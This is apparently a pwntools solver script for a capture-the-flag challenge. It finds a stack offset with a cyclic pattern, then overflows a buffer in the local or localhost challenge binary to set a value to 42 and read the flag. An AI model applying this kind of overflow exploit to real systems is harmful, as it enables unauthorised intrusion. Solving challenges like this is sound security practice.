#!/usr/bin/env python
import pwn

import sys

REMOTE_ADDR = "127.0.0.1"
REMOTE_PORT = "1337"

def get_challenge():
    if pwn.args.REMOTE:
        return pwn.remote(REMOTE_ADDR, REMOTE_PORT)
    else:
        return pwn.process("./chal")

chal = get_challenge()

chal.sendline(pwn.cyclic(0x100))
chal.readlines(2)

target_leak = chal.recvline()
padding_len = pwn.cyclic_find(int(target_leak.strip().split()[-1]))

chal.close()

# perform the actual exploit
chal = get_challenge()
chal.sendline(b"A" * padding_len + pwn.p32(42))

chal.readlines(2)
flag = chal.recvline().strip().split()[-1].decode()

chal.close()

print(f"Found the flag: {flag}")
